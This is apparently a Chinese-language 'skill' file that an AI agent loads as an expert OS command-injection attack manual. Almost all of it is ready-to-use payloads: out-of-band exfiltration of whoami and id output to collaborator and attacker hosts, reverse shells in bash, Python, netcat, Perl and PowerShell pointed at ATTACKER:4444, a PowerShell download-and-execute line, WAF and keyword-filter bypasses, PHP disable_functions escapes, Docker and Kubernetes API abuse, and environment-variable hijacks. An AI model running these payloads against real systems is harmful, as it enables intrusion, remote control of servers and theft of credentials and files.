---
name: cmdi-command-injection
description: 命令注入剧本。当用户输入可能到达 shell 命令、进程执行、转换器、导入管道或盲外带命令接收器时使用。
---

# 技能：操作系统命令注入——专家攻击手册

> **AI 加载指令**：专家级命令注入技术。涵盖所有 shell 伪字符、盲注入、基于时间的检测、带外数据提取、多语言有效载荷和真实世界的代码模式。基础模型会因意外输入向量而错过微妙的注入。

## 0. 相关路由

在深入之前，您可以先加载：

- [上传不安全文件](../upload-insecure-files/SKILL.md)，当 shell 沉点（sink）是更广泛的上传、导入或转换工作流的一部分时

### 第一次尝试的有效载荷家族

| 上下文 | 从...开始 | 备用 |
|---|---|---|
| 通用 shell 分隔符 | `;id` | `&&id` |
| 引用参数 | `";id;"` | `';id;'` |
| 盲时序 | `;sleep 5` | `& timeout /T 5 /NOBREAK` |
| 命令替换 | `$(id)` | `` `id` `` |
| 带外 DNS | `;nslookup token.collab` | Windows `nslookup` 变体 |

```text
cat$IFS/etc/passwd
{cat,/etc/passwd}
%0aid
```

---

## 1. SHELL 伪字符（注入操作符）

这些字符会跳出命令上下文并注入新命令：

| 伪字符 | 行为 | 示例 |
|---|---|---|
| `;` | 无论什么情况都运行第二个命令 | `dir; whoami` |
| `\|` | 将标准输出管道到第二个命令 | `dir \| whoami` |
| `\|\|` | 只有第一个命令失败时才运行第二个 | `dir \|\| whoami` |
| `&` | 在后台运行第二个命令（或在 Windows 中按顺序运行） | `dir & whoami` |
| `&&` | 只有第一个命令成功时才运行第二个 | `dir && whoami` |
| `$(cmd)` | 命令替换 | `echo $(whoami)` |
| `` `cmd` `` | 命令替换（反引号） | `` echo `whoami` `` |
| `>` | 将标准输出重定向到文件 | `cmd > /tmp/out` |
| `>>` | 追加到文件 | `cmd >> /tmp/out` |
| `<` | 将文件作为标准输入读取 | `cmd < /etc/passwd` |
| `%0a` | 换行符（URL 编码） | `cmd%0awhoami` |
| `%0d%0a` | 回车换行符 | 多命令注入 |

---

## 2. 常见易受攻击的代码模式

### PHP
```php
$dir = $_GET['dir'];
$out = shell_exec("du -h /var/www/html/" . $dir);
// 注入：dir=../ ; cat /etc/passwd
// 注入：dir=../ $(cat /etc/passwd)

exec("ping -c 1 " . $ip);          // $ip = "127.0.0.1 && cat /etc/passwd"
system("convert " . $file);        // ImageMagick RCE
passthru("nslookup " . $host);     // $host = "x.com; id"
```

### Python
```python
import os
os.system("curl " + url)            # url = "x.com; id"
subprocess.call("ls " + path, shell=True)  # shell=True 是关键漏洞
os.popen("ping " + host)
```

### Node.js
```javascript
const { exec } = require('child_process');
exec('ping ' + req.query.host, ...);  // host = "x.com; id"
```

### Perl
```perl
$dir = param("dir");
$command = "du -h /var/www/html" . $dir;
system($command);
// 注入 dir 字段：| cat /etc/passwd
```

### ASP (经典)
```vb
szCMD = "type C:\logs\" & Request.Form("FileName")
Set oShell = Server.CreateObject("WScript.Shell")
oShell.Run szCMD
// 注入 FileName：foo.txt & whoami > C:\inetpub\wwwroot\out.txt
```

---

## 3. 盲命令注入——检测

当响应未显示命令输出时：

### 基于时间的检测
```bash
# Linux:
; sleep 5
| sleep 5
$(sleep 5)
`sleep 5`
& sleep 5 &

# Windows:
& timeout /T 5 /NOBREAK
& ping -n 5 127.0.0.1
& waitfor /T 5 signal777
```
比较有无有效载荷的响应时间。5 秒以上延迟 = 确认。

### 带外通过 DNS
```bash
# Linux:
; nslookup BURP_COLLAB_HOST
; host `whoami`.BURP_COLLAB_HOST
$(nslookup $(whoami).BURP_COLLAB_HOST)

# Windows:
& nslookup BURP_COLLAB_HOST
& nslookup %USERNAME%.BURP_COLLAB_HOST
```

### 带外通过 HTTP
```bash
# Linux:
; curl http://BURP_COLLAB_HOST/`whoami`
; wget http://BURP_COLLAB_HOST/$(id|base64)

# Windows:
& powershell -c "Invoke-WebRequest http://BURP_COLLAB_HOST/$(whoami)"
```

### 带外通过带外文件
```bash
; id > /var/www/html/RANDOM_FILE.txt
# 然后访问：https://target.com/RANDOM_FILE.txt
```

---

## 4. 注入上下文变化

### 在引号字符串中
```bash
command "INJECT"
# 注入：" ; id ; "
# 结果：command "" ; id ; ""
```

### 在单引号字符串中
```bash
command 'INJECT'
# 注入：'; id;'
# 结果：command ''; id;''
```

### 在反引号执行中
```bash
output=`command INJECT`
# 注入：x`; id ;`
```

### 文件路径上下文
```bash
cat /var/log/INJECT
# 注入： ../../../etc/passwd (路径遍历)
# 注入： access.log; id (命令注入)
```

---

## 5. 有效载荷库

### 信息收集
```bash
; id                          # 当前用户
; whoami                      # 用户名
; uname -a                    # 操作系统信息
; cat /etc/passwd             # 用户列表
; cat /etc/shadow             # 密码哈希（如果 root）
; ls /home/                   # 主目录
; env                         # 环境变量（数据库凭证、API 密钥！）
; printenv                    # 相同
; cat /proc/1/environ         # 进程环境
; ifconfig                    # 网络接口
; cat /etc/hosts              # 主机条目
```

### 反向 Shell（Linux）
```bash
# Bash:
; bash -i >& /dev/tcp/ATTACKER/4444 0>&1
; bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'

# Python:
; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Netcat（带 -e 参数）:
; nc ATTACKER 4444 -e /bin/bash

# Netcat（不带 -e / OpenBSD）:
; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER 4444 >/tmp/f

# Perl:
; perl -e 'use Socket;$i="ATTACKER";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### 反向 Shell（通过 PowerShell）
```powershell
& powershell -NoP -NonI -W Hidden -Exec Bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')"

& powershell -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

## 6. 过滤绕过技术

### 空格替代（当空格被过滤时）
```bash
cat</etc/passwd          # < 代替空格
{cat,/etc/passwd}        # 大括号扩展
cat$IFS/etc/passwd       # $IFS 变量（字段分隔符）
X=$'\x20'&&cat${X}/etc/passwd  # 十六进制编码的空格
```

### 反斜杠替代（当 `/` 被过滤时）
```bash
$'\057'etc$'\057'passwd  # 八进制表示
cat /???/???sec???        # 通配符扩展
```

### 通过变量组合绕过关键词
```bash
a=c;b=at;c=/etc/passwd; $a$b $c   # 'cat /etc/passwd'
c=at;ca$c /etc/passwd              # cat
```

### 换行注入
```
cmd%0Aid%0Awhoami          # URL 编码的换行符
cmd$'\n'id$'\n'whoami      # 字面换行符
```

---

## 7. 常见注入入口点

| 入口 | 示例 |
|---|---|
| 网络工具 | ping, nslookup, traceroute, whois 表单 |
| 文件转换 | 图片缩放, PDF 生成, 格式转换 |
| 邮件发送器 | 发件人地址, 通知邮件中的姓名字段 |
| 搜索/排序参数 | 传递给 grep, find, sort 命令 |
| 日志查看 | 传递给 tail, grep 命令 |
| 自定义脚本执行 | "运行测试" 功能, CI/CD 钩子 |
| DNS 查询功能 | rDNS 查询, WHOIS 查询 |
| 备份/恢复功能 | 文件路径参数 |
| 压缩处理 | zip/unzip, 带用户提供的文件名的 tar |

---

## 8. 盲注入决策树

```
发现潜在注入点？
├── 尝试基本： ; sleep 5
│   └── 响应延迟？ → 确认盲注入
│       ├── 通过时序提取数据：if/then sleep
│       └── 使用带外：curl/nslookup 到协作方
│
├── 未观察到延迟？
│   ├── 尝试： | sleep 5
│   ├── 尝试： $(sleep 5)
│   ├── 尝试： ` sleep 5 `
│   ├── 尝试 URL 编码后： %3B%20sleep%205
│   └── 尝试双重编码： %253B%2520sleep%25205
│
└── 全部被阻止 → 检查 WEB 应用层
    输入过滤？ → 不同的编码方式
    特定命令过滤？ → 空间绕过, $IFS, 通配符
```

---

## 9. 高级 WAF 绕过技术

### 通配符扩展

```bash
# 使用 ? 和 * 绕过关键词过滤器：
/???/??t /???/p??s??    # /bin/cat /etc/passwd
/???/???/????2 *.php     # /usr/bin/find2 *.php (近似)

# 特定文件的通配符：
cat /e?c/p?sswd
cat /e*c/p*d
```

### cat 替代（当 "cat" 被过滤时）

```bash
tac /etc/passwd          # 反向 cat
nl /etc/passwd           # 带编号的行
head /etc/passwd
tail /etc/passwd
more /etc/passwd
less /etc/passwd
sort /etc/passwd
uniq /etc/passwd
rev /etc/passwd | rev
xxd /etc/passwd
strings /etc/passwd
od -c /etc/passwd
base64 /etc/passwd       # 然后离线解码
```

### 注释插入（PHP 特定）

```bash
# 在函数名中插入注释以绕过 WAF：
sys/*x*/tem('id')        # PHP 在某些 eval 上下文中忽略 /* */
# 注意：这适用于 eval() 和类似的 PHP 动态调用
```

### XOR 字符串构造（PHP）

```php
# 从可打印字符的 XOR 构建函数名：
$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');
# 生成： "assert"
$_('%13%19%13%14%05%0d'|'%60%60%60%60%60%60');
# 计算：assert("system")
```

### Base64/ROT13 编码

```php
# 编码有效载荷，在运行时解码：
base64_decode('c3lzdGVt')('id');     # system('id')
str_rot13('flfgrz')('id');           # system → flfgrz 通过 ROT13
```

### chr() 构造

```php
# 逐个字符构建字符串：
chr(115).chr(121).chr(115).chr(116).chr(101).chr(109)  # "system"
```

### Dollar-Sign 变量技巧

```bash
# $IFS（内部字段分隔符）作为空格：
cat$IFS/etc/passwd
cat${IFS}/etc/passwd

# 未设置变量扩展为空：
c${x}at /etc/passwd      # $x 未设置 → "cat"
```

---

## 10. PHP disable_functions 绕过路径

当 `system()`, `exec()`, `shell_exec()`, `passthru()`, `popen()`, `proc_open()` 都被禁用时：

### 路径 1：LD_PRELOAD + mail()/putenv()

```php
// 1. 上传共享对象 (.so)，它钩住一个 libc 函数
// 2. 设置 LD_PRELOAD 指向它
putenv("LD_PRELOAD=/tmp/evil.so");
// 3. 触发外部进程（mail() 调用 sendmail）
mail("a@b.com", "", "");
// .so 的构造函数以 shell 访问运行
```

### 路径 2：Shellshock (CVE-2014-6271)

```php
// 如果 bash 易受 Shellshock 攻击：
putenv("PHP_LOL=() { :; }; /usr/bin/id > /tmp/out");
mail("a@b.com", "", "");
// Bash 处理函数定义并运行尾随命令
```

### 路径 3：Apache mod_cgi + .htaccess

```php
// 写入 .htaccess 启用 CGI：
file_put_contents('/var/www/html/.htaccess', 'Options +ExecCGI\nAddHandler cgi-script .sh');
// 写入 CGI 脚本：
file_put_contents('/var/www/html/cmd.sh', "#!/bin/bash\necho Content-type: text/html\necho\n$1");
chmod('/var/www/html/cmd.sh', 0755);
// 访问： /cmd.sh?id
```

### 路径 4：PHP-FPM / FastCGI

```php
// 如果 PHP-FPM 套接字可访问（/var/run/php-fpm.sock 或端口 9000）：
// 发送定制的 FastCGI 请求来执行任意 PHP，不同的 php.ini
// 工具：https://github.com/neex/phuip-fpizdam
// 覆盖：PHP_VALUE=auto_prepend_file=/tmp/shell.php
```

### 路径 5：COM 对象（Windows）

```php
// Windows 仅限，如果 COM 扩展启用：
$wsh = new COM('WScript.Shell');
$exec = $wsh->Run('cmd /c whoami > C:\inetpub\wwwroot\out.txt', 0, true);
```

### 路径 6：ImageMagick Delegate (CVE-2016-3714 "ImageTragick")

```php
// 如果 ImageMagick 处理用户上传的图片：
// 上传 SVG/MVG 嵌入命令：
// exploit.svg 的内容：
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|id > /tmp/pwned")'
pop graphic-context
```

**也请考虑（总结）：** iconv (CVE-2024-2961) 通过 `php://filter/convert.iconv`；FFI (`FFI::cdef` + `libc`) 当扩展启用时。

---

## 11. 组件级命令注入

### ImageMagick Delegate 滥用

```
# MVG 格式中 URL 带有 shell 命令：
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'https://127.0.0.1/x.php?x=`id > /tmp/out`'
pop graphic-context

# 或通过文件名：convert '|id' out.png
```

### FFmpeg (HLS/concat 协议)

```
# SSRF/LFI 通过 m3u8 播放列表：
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
concat:http://attacker.com/header.txt|file:///etc/passwd
#EXT-X-ENDLIST

# 上传为 .m3u8，FFmpeg 处理并可能泄露文件内容在输出中
```

### Elasticsearch Groovy 脚本（5.x 之前）

```json
POST /_search
{
  "query": { "match_all": {} },
  "script_fields": {
    "cmd": {
      "script": "Runtime rt = Runtime.getRuntime(); rt.exec('id')"
    }
  }
}
```

### Ping/Traceroute/NSLookup 诊断页面

```
# 网络诊断功能中的经典注入点：
# 输入：127.0.0.1; id
# 输入：127.0.0.1 && cat /etc/passwd
# 输入：`id`.attacker.com (DNS 外泄通过反引号)
# 这些功能直接调用 OS 命令并使用用户输入
```

**其他接收器（快速参考）：** PDF 生成器 (wkhtmltopdf / WeasyPrint 带用户 HTML)；Git 包装器 (`git clone` URL / 钩子)。

---

## 12. WINDOWS CMD.EXE VS POWERSHELL 注入矩阵

| 功能 | cmd.exe | PowerShell |
|---------|---------|------------|
| **命令分隔符** | `&`, `&&`, `\|\|`, `;` (有限) | `;`, `\|`, `&` (调用操作符) |
| **变量扩展** | `%VARIABLE%`, `!VAR!` (延迟) | `$env:VARIABLE`, `$Variable` |
| **转义字符** | `^` (脱字符) | `` ` `` (反引号) |
| **命令替换** | `FOR /F` 循环 | `$()` 子表达式 |
| **编码执行** | N/A | `-EncodedCommand` (base64 UTF-16LE) |
| **管道** | `\|` (仅 stdout) | `\|` (对象，非文本) |
| **注释** | `REM`, `::` | `#` |
| **字符串引号** | `"双引号"` 仅 | `"双引号"`, `'单引号'` (无扩展) |

### cmd.exe 特定有效载荷

```batch
REM 命令链式执行
dir & whoami
dir && whoami
dir || whoami

REM 脱字符绕过关键词过滤器
w^h^o^a^m^i
n^e^t u^s^e^r

REM 变量扩展注入
set CMD=whoami
%CMD%

REM 环境变量外泄通过 DNS
nslookup %USERNAME%.attacker.com
nslookup %COMPUTERNAME%.attacker.com

REM 延迟扩展（当 !var! 启用时）
cmd /V:ON /C "set x=whoami&!x!"
```

### PowerShell 特定有效载荷

```powershell
# 分号分隔符
Get-Process; whoami

# 子表达式
"$(whoami)"
Write-Output $(hostname)

# Base64 编码命令 (UTF-16LE)
powershell -EncodedCommand dwBoAG8AYQBtAGkA
# 解码为：whoami

# Invoke-Expression 混淆
$a='who';$b='ami';iex "$a$b"
& (gcm *ke-*) "whoami"

# 下载并执行
IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')
IEX (iwr http://attacker/payload.ps1 -UseBasicParsing).Content

# 受约束的语言模式绕过（如果可用）
powershell -Version 2 -Command "whoami"
```

### 跨平台有效载荷差异

| 目标 | 时延 | DNS 外泄 | 文件读取 |
|--------|-----------|-----------|-----------|
| Linux/macOS | `sleep 5` | `nslookup $(whoami).atk.com` | `cat /etc/passwd` |
| cmd.exe | `timeout /T 5 /NOBREAK` | `nslookup %USERNAME%.atk.com` | `type C:\Windows\win.ini` |
| PowerShell | `Start-Sleep 5` | `nslookup $(whoami).atk.com` | `Get-Content C:\Windows\win.ini` |

### 先检测的 polyglot

```text
;sleep${IFS}5;#&timeout /T 5 /NOBREAK&#
```

跨 sh/bash/cmd 上下文工作——其中一个分隔符会触发。

---

## 13. 容器 / K8s 执行注入

### kubectl exec 注入

当 Web 应用构造 `kubectl exec` 命令并包含用户输入时：

# 易受攻击的模式
kubectl exec $POD_NAME -- /bin/sh -c "echo $USER_INPUT"

# 通过 Pod 名称进行注入
POD_NAME="mypod -- /bin/sh -c whoami #"
→ kubectl exec mypod -- /bin/sh -c whoami # -- /bin/sh -c "echo ..."

# 通过命令中的用户输入进行注入
USER_INPUT='"; cat /etc/passwd; echo "'
→ kubectl exec pod -- /bin/sh -c "echo ""; cat /etc/passwd; echo """

### Docker exec 注入

```text
# 易受攻击的 Web 管理面板
docker exec $CONTAINER_NAME $COMMAND

# 通过容器名称进行注入
CONTAINER_NAME="web_app -u root web_app"
→ docker exec web_app -u root web_app $COMMAND  (以 root 身份运行)

# 通过命令参数进行注入
COMMAND="status; cat /etc/shadow"
→ docker exec container /bin/sh -c "status; cat /etc/shadow"
```

### 容器运行时 API（未认证）

```text
# Docker socket 暴露（2375/2376 或 /var/run/docker.sock）
POST /containers/create HTTP/1.1
{"Image":"alpine","Cmd":["/bin/sh","-c","cat /host/etc/shadow"],"Binds":["/:/host"]}

# 然后启动并 exec
POST /containers/{id}/start
POST /containers/{id}/exec {"Cmd":["cat","/host/etc/shadow"]}

# Kubernetes API（6443/8443 未认证）
POST /api/v1/namespaces/default/pods/{name}/exec?command=whoami&stdout=true
```

### 需要关注的接收点

| 组件 | 注入向量 |
|-----------|-----------------|
| CI/CD 流水线（Jenkins、GitLab CI） | 构建步骤参数、环境变量 |
| Kubernetes CronJob | 来自用户定义计划的 `.spec.containers[].command` |
| Helm chart 值 | `values.yaml` 使用 `{{ }}` 模板化到 Pod 规范中 |
| 容器编排 UI | Portainer、Rancher 等中的“运行命令”功能 |

---

## 14. 环境变量注入

当应用程序允许设置或影响环境变量时，某些变量具有**隐式执行**语义：

### Linux / Unix

| 变量 | 效果 | 利用方式 |
|----------|--------|-------------|
| `LD_PRELOAD` | 在任何共享库之前加载；构造函数在进程启动时运行 | `putenv("LD_PRELOAD=/tmp/evil.so"); mail("a@b","","");` |
| `LD_LIBRARY_PATH` | 覆盖库搜索路径 | 在受控目录中放置恶意的 `libc.so.6` |
| `BASH_ENV` | 当非交互式 bash 启动时执行 | `BASH_ENV=/tmp/evil.sh` → 任何 `system()` / `popen()` 调用都会 source 它 |
| `ENV` | 对于 POSIX `sh`，与 BASH_ENV 相同 | `ENV=/tmp/evil.sh` |
| `PROMPT_COMMAND` | 在每个交互式提示符之前执行 | `PROMPT_COMMAND="curl http://atk.com/$(whoami)"` |
| `PS1` | 提示符字符串，在 bash 中支持 `$()` 扩展 | `PS1='$(cat /etc/passwd > /tmp/out) \$ '` |
| `PYTHONSTARTUP` | 解释器启动时执行的 Python 脚本 | 注入指向恶意 `.py` 文件的路径 |
| `PERL5OPT` | 传递给每次 Perl 调用的选项 | `PERL5OPT='-Mbase;system("id")'` |
| `NODE_OPTIONS` | 传递给每次 Node.js 调用的选项 | `NODE_OPTIONS='--require /tmp/evil.js'` |
| `RUBYOPT` | Ruby 的选项 | `RUBYOPT='-r/tmp/evil.rb'` |

### Windows

| 变量 | 效果 |
|----------|--------|
| `COMSPEC` | 命令解释器的路径；`system()` 调用会使用它 | 设置为恶意可执行文件 |
| `PATH` | 命令解析顺序；在路径中更早的位置放置恶意二进制文件 | DLL/EXE 搜索顺序劫持 |
| `PSModulePath` | PowerShell 会自动从这些路径加载模块 | 植入恶意模块 |

### 攻击场景

**PHP `putenv()` + `mail()`**：
```php
// 当 putenv() 未被禁用且 mail() 可用时：
putenv("LD_PRELOAD=/tmp/evil.so");
mail("a@b.com","","","");
// mail() 调用 sendmail → 加载 evil.so → 构造函数执行任意代码
```

**通过环境变量的 Git hook 注入**：
```bash
# GIT_DIR / GIT_WORK_TREE 操纵
GIT_DIR=/tmp/evil_repo/.git git status
# 如果受控仓库中存在钩子，它们将被执行
```

**Node.js `--require` 注入**：
```bash
NODE_OPTIONS="--require=/tmp/reverse_shell.js" node /app/server.js
# reverse_shell.js 在 server.js 之前被加载
```
